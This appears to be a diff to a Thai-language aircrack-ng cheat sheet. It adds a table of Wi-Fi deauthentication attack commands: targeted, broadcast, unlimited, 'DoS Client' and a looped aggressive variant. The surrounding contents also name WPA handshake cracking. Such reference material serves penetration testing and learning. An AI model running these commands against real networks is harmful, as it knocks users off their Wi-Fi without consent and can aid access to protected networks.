@@ -5,6 +5,7 @@
 - [airmon-ng – เปิด/ปิด Monitor Mode](#airmon-ng--เปิดปิด-monitor-mode)
 - [airodump-ng – สแกน Wi-Fi และดักจับ Packet](#airodump-ng--สแกน-wi-fi-และดักจับ-packet)
 - [aireplay-ng – ยิง Packet และโจมตี](#aireplay-ng--ยิง-packet-และโจมตี)
+  - [รูปแบบการยิง deauth ที่นิยม](#รูปแบบการยิง-deauth-ที่นิยม)
 - [aircrack-ng – ถอดรหัส WPA Handshake](#aircrack-ng--ถอดรหัส-wpa-handshake)
 
 ---
@@ -94,6 +95,16 @@ sudo aireplay-ng --deauth 10 -a <BSSID> wlan1mon
 ```bash
 sudo aireplay-ng --test wlan1mon
 ```
+
+### 🔫 รูปแบบการยิง deauth ที่นิยม
+
+| รูปแบบ | คำอธิบาย | คำสั่ง |
+|--------|----------|--------|
+| 🎯 รายตัว (Targeted) | ยิงเฉพาะ client ที่ระบุ | `aireplay-ng --deauth 10 -a <BSSID> -c <Client MAC> wlan1mon` |
+| 📡 ทั้งวง (Broadcast) | ไล่ client ทุกตัวใน AP | `aireplay-ng --deauth 10 -a <BSSID> wlan1mon` |
+| 🔁 ไม่จำกัดรอบ | ยิงเรื่อย ๆ จนกว่าจะหยุด | `aireplay-ng --deauth 0 -a <BSSID> wlan1mon` |
+| ☠️ DoS Client | ยิงไม่หยุดเฉพาะรายตัว | `aireplay-ng --deauth 0 -a <BSSID> -c <Client MAC> wlan1mon` |
+| 🚀 Aggressive Loop | ยิงหลายรอบติด ๆ กัน | `for i in {1..5}; do aireplay-ng --deauth 25 -a <BSSID> wlan1mon; done` |
 
 ---
 
